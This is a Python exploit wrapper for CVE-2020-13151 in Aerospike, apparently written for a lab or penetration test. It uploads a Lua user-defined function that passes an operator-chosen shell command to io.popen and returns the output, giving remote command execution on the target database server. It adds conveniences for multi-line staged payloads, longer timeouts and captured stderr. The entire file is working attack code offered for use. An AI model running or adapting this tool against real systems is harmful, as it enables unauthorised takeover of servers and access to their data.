#!/usr/bin/env python3
"""Run a shell command (or a whole script) on the Aerospike target via CVE-2020-13151.

A more comfortable wrapper than the raw PoC:

  * longer client timeouts, so a slow command is not cut at 8 s
  * --cmd-file to send a multi-line payload without quoting it into a shell argument
  * appends 2>&1 by default, because io.popen only captures stdout
  * prints the numeric result code alongside the output

Usage:
  aero_cmd.py --host 192.168.152.143 --cmd 'id'
  aero_cmd.py --host 192.168.152.143 --cmd-file stage.sh
"""
import argparse
import os
import random
import shutil
import string
import tempfile

import aerospike

UDF_SRC = """function runCMD(rec, cmd)
    local handle = io.popen(cmd)
    local out = handle:read("*a")
    handle:close()
    return out
end
"""

UDF_NAME = "aero_cmd_poc.lua"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="192.168.152.143")
    ap.add_argument("--port", type=int, default=3000)
    ap.add_argument("--namespace", default="test")
    ap.add_argument("--setname", default="recon")
    ap.add_argument("--timeout", type=int, default=25000,
                    help="client/socket timeout in ms (default 25000)")
    ap.add_argument("--no-stderr", action="store_true",
                    help="do not append 2>&1 to the command")
    grp = ap.add_mutually_exclusive_group(required=True)
    grp.add_argument("--cmd")
    grp.add_argument("--cmd-file")
    args = ap.parse_args()

    if args.cmd_file:
        with open(args.cmd_file, encoding="utf-8") as fh:
            cmd = fh.read().strip()
    else:
        cmd = args.cmd

    if not args.no_stderr:
        # The space after '{' is required: '{id' is a command name, not a brace group,
        # and a brace-group syntax error loses the 2>&1 with it.
        cmd = "{ " + cmd + "\n} 2>&1"

    # The client drops a copy of the UDF named after its basename in the *current
    # directory*, whatever path it was given. Register from a temp dir so it does not
    # litter the operator's shell.
    workdir = tempfile.mkdtemp(prefix="aero_cmd_")
    udf_path = os.path.join(workdir, UDF_NAME)
    with open(udf_path, "w", encoding="utf-8") as fh:
        fh.write(UDF_SRC)

    client = aerospike.client(
        {
            "hosts": [(args.host, args.port)],
            "policies": {
                "timeout": args.timeout,
                "total_timeout": args.timeout,
                "socket_timeout": args.timeout,
            },
        }
    ).connect()

    key = "".join(random.choice(string.ascii_lowercase) for _ in range(16))
    cwd = os.getcwd()
    try:
        client.put((args.namespace, args.setname, key), {"pk": key})
        os.chdir(workdir)
        client.udf_put(udf_path)
        os.chdir(cwd)
        result = client.apply(
            (args.namespace, args.setname, key), "aero_cmd_poc", "runCMD", [cmd]
        )
    finally:
        os.chdir(cwd)
        client.close()
        shutil.rmtree(workdir, ignore_errors=True)

    if isinstance(result, tuple):
        code, value = result
        print(f"[rc={code}]")
        print(value if value is not None else "(no output)")
    else:
        print(result if result is not None else "(no output)")


if __name__ == "__main__":
    main()
